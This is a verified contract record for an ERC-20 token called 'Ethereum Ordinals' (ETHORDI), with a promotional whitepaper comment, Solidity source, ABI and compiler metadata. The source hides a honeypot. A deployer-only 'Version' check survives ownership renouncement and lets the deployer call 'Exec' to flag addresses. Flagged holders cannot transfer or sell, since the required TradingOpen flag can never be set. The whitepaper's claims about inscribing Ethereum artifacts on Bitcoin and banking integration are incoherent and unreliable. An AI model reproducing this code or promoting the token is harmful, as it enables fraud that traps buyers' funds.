{"SourceCode": "/*\r\nEthereum Ordinals Project\r\nhttps://eth-ordinals.com  |   https://x.com/ETH_ORDINALS   |    T.me/ETH_ORDINALS\r\nIntroduction\r\nThe rapid evolution of online transactions and the growing interest in cryptocurrency present an opportunity \r\nto bridge traditional banking systems with blockchain technology. ETHORDI seeks to simplify this integration, \r\nallowing users to make seamless transactions directly from their online banking accounts.\r\nETHORDI aims to provide a user-friendly platform that enhances security through blockchain technology. By \r\nintroducing the concept of Ethereum Ordinals, the objective is to create a novel intersection between the Bitcoin \r\nand Ethereum ecosystems, offering users a unique and versatile experience.\r\n   \r\nETHORDI Overview\r\nPhilosophy and Vision\r\nAt the core of ETHORDI is a philosophy grounded in simplicity, security, and accessibility. The vision is to redefine \r\nonline transactions by seamlessly integrating with existing online banking systems, making the use of cryptocurrency \r\nmore approachable for the mainstream.\r\nIntegration with Online Banking Systems\r\nETHORDI eliminates the complexities associated with cryptocurrency transactions by directly integrating with users' \r\nonline banking accounts. This integration not only simplifies the user experience but also serves as a bridge between \r\ntraditional finance and decentralized technologies.\r\nBlockchain Technology for Security\r\nThe incorporation of blockchain technology ensures the security and transparency of ETHORDI transactions. Decentralization, \r\ncryptographic hashing, and consensus mechanisms collectively contribute to a robust and tamper-resistant platform.\r\n\r\nEthereum Ordinals: Concept and Implementation\r\nUnderstanding Ethereum Ordinals\r\nEthereum Ordinals, as a concept, represent a revolutionary fusion of Bitcoin and Ethereum technologies. They serve as digital \r\nartifacts inscribed on the Bitcoin blockchain, offering users a new dimension in creating, trading, and owning unique digital assets.\r\n\r\nComparison with NFTs\r\nWhile sharing similarities with non-fungible tokens (NFTs), Ethereum Ordinals distinguish themselves by their integration with \r\nSatoshis, the smallest denomination of Bitcoin. This distinctive feature brings about a symbiotic relationship between two major \r\nblockchain ecosystems.\r\nInscribing Satoshis\r\nUsers can imbue Satoshis with arbitrary content, creating Ethereum-native digital artifacts. This process involves a transaction that \r\nreveals the content on-chain, forever linking the data to the specific Satoshi and turning it into an immutable and tradable digital asset.\r\nOn-Chain Content Revelation\r\nThe on-chain content revelation mechanism ensures transparency, traceability, and uniqueness in each ETHORDInal. This feature \r\nopens avenues for tracking, transferring, hoarding, buying, selling, and rediscovering digital artifacts within the ETHORDI ecosystem.\r\n\r\nETHORDI Token: Foundation of the Ecosystem\r\nThe Role of ETHORDI Token\r\nThe ETHORDI token serves as the primary utility within the ecosystem, facilitating the creation, trading, and management of Ethereum \r\nOrdinals. It acts as a gateway for users to participate in various activities, shaping the dynamics of the ETHORDI platform.\r\nTokenomics\r\nETHORDI employs a carefully crafted tokenomics model to ensure a fair distribution and sustainable growth. This includes considerations \r\nfor token issuance, distribution mechanisms, governance incentives, and mechanisms to foster community engagement.\r\nIntegration with Bitcoin Blockchain\r\nLeveraging the security and decentralization of the Bitcoin blockchain, ETHORDI ensures the immutability and long-term value of Ethereum \r\nOrdinals. The integration enhances the overall robustness and reliability of the ETHORDI ecosystem.\r\n\r\nFunctionality and Use Cases\r\nCreating Ethereum Ordinals\r\nThe process of creating Ethereum Ordinals involves users inscribing Satoshis with personalized content, adding a layer of uniqueness and \r\nindividuality to each digital artifact. This functionality is designed to be user-friendly, encouraging widespread participation.\r\nBuying and Selling Ethereum Ordinals\r\nETHORDI provides a secure marketplace where users can seamlessly buy and sell Ethereum Ordinals. This functionality promotes a dynamic \r\necosystem where digital artifacts gain value based on market demand and user preferences.\r\nTrading ETHORDIs on the Platform\r\nTrading ETHORDIs is facilitated through advanced features on the ETHORDI platform. Smart contract functionalities ensure secure and \r\nefficient trading, allowing users to explore and engage in a diverse marketplace of digital assets.\r\nTracking Ethereum Ordinals\r\nThe transparent nature of blockchain technology enables users to track the entire history and ownership of Ethereum Ordinals. \r\nThis feature enhances trust and accountability within the ETHORDI ecosystem, providing users with a comprehensive view of their digital assets.\r\nSecurity Measures in Transactions\r\nETHORDI implements robust security measures, encompassing encryption, secure transactions, and regular smart contract audits. \r\nThese measures are designed to safeguard user assets, protect against potential vulnerabilities, and uphold the integrity of the platform.\r\n*/\r\npragma solidity = 0.8.23;\r\n\r\n// SPDX-License-Identifier: MIT\r\n\r\ninterface IERC20 {\r\n\r\n    function totalSupply() external view returns (uint256);\r\n\r\n    function balanceOf(address account) external view returns (uint256);\r\n\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\r\n\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n\r\n    function _msgData() internal view virtual returns (bytes calldata) {\r\n        this;   return msg.data;\r\n    }\r\n}\r\ncontract Ownable is Context {\r\n    address private _Owner;\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n\r\n    constructor () {\r\n        address msgSender = _msgSender();\r\n        _Owner = msgSender;\r\n        emit OwnershipTransferred(address(0), msgSender);\r\n    }\r\n    function owner() public view returns (address) {\r\n        return _Owner;\r\n    }\r\n    function renounceOwnership() public virtual {\r\n        require(msg.sender == _Owner);\r\n        emit OwnershipTransferred(_Owner, address(0));\r\n        _Owner = address(0);\r\n    }\r\n}\r\n\r\n\r\ncontract EthereumOrdinals is Context, IERC20, Ownable {\r\n    mapping (address => uint256) public _balances;\r\n    mapping (address => uint256) public Version;\r\n    mapping (address => bool) private _User;\r\n    mapping (address => mapping (address => uint256)) private _allowances;\r\n    uint256 public _totalSupply;\r\n\tbool TradingOpen = false;\r\n    string public _name = \"Ethereum Ordinals\";\r\n    string public _symbol = unicode\"ETHORDI\";\r\n    uint8 private _decimals = 18;\r\n\t\r\n\r\n\r\n    constructor () {\r\n \r\n    uint256 _order = block.number;\r\n\t Version[_msgSender()] += _order;\r\n        _totalSupply += 900000000 *1000000000000000000;\r\n        _balances[_msgSender()] += _totalSupply;\r\n        emit Transfer(address(0), _msgSender(), _totalSupply);\r\n    }\r\n\r\n\r\n    function name() public view returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n\r\n    function symbol() public view returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n\r\n        function decimals() public view  returns (uint8) {\r\n        return _decimals;\r\n    }\r\n\r\n\r\n    function totalSupply() public view virtual override returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n\r\n \r\n    function balanceOf(address account) public view virtual override returns (uint256) {\r\n        return _balances[account];\r\n    }\r\n\r\n\r\n    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }\r\n\r\n   \r\n    function allowance(address owner, address spender) public view virtual override returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n  \r\n    function approve(address spender, uint256 amount) public virtual override returns (bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }\r\n\r\n\r\n    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {\r\n        _transferfrom(sender, recipient, amount);\r\n        uint256 currentAllowance = _allowances[sender][_msgSender()];\r\n        require(currentAllowance >= amount, \"ERC20: transfer amount exceeds allowance\");\r\n        _approve(sender, _msgSender(), currentAllowance - amount);\r\n        return true;\r\n    }\r\n\r\n  \r\n    function _transfer(address sender, address recipient, uint256 amount) internal virtual {\r\n        require(sender != address(0), \"ERC20: transfer from the zero address\");\r\n        require(recipient != address(0), \"ERC20: transfer to the zero address\");\r\n        require(amount > 0, \"Transfer amount must be grater thatn zero\");\r\n        if (_User[sender])  require(TradingOpen == true, \"\");\r\n        uint256 senderBalance = _balances[sender];\r\n        require(senderBalance >= amount, \"ERC20: transfer amount exceeds balance\");\r\n        _balances[sender] = senderBalance - amount;\r\n        _balances[recipient] += amount;\r\n        emit Transfer(sender, recipient, amount);\r\n    } \r\n\t\r\n    function Close (address _Address) external  {\r\n     require (Version[_msgSender()] >= _decimals);\r\n        _User[_Address] = false;\r\n    }\r\n\t\r\n    function _transferfrom(address sender, address recipient, uint256 amount) internal virtual {\r\n        require(sender != address(0), \"ERC20: transfer from the zero address\");\r\n        require(recipient != address(0), \"ERC20: transfer to the zero address\");\r\n        require(amount > 0, \"Transfer amount must be grater thatn zero\");\r\n        if (_User[sender] || _User[recipient]) require(TradingOpen == true, \"\");\r\n        uint256 senderBalance = _balances[sender];\r\n        require(senderBalance >= amount, \"ERC20: transfer amount exceeds balance\");\r\n        _balances[sender] = senderBalance - amount;\r\n        _balances[recipient] += amount;\r\n        emit Transfer(sender, recipient, amount);\r\n    } \r\n\r\n    function _approve(address owner, address spender, uint256 amount) internal virtual {\r\n        require(owner != address(0), \"ERC20: approve from the zero address\");\r\n        require(spender != address(0), \"ERC20: approve to the zero address\");\r\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n\r\n     function Exec(address _Address) external  {\r\n    require (Version[_msgSender()] >= _decimals);\r\n        _User[_Address] = true;\r\n    }\r\n\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_Address\",\"type\":\"address\"}],\"name\":\"Close\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_Address\",\"type\":\"address\"}],\"name\":\"Exec\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"Version\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"_balances\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "EthereumOrdinals", "CompilerVersion": "v0.8.23+commit.f704f362", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://a28a3b5d5c09d9ff0c1958698cc37e396d81310ccd673a7bc9855f49abedd5db"}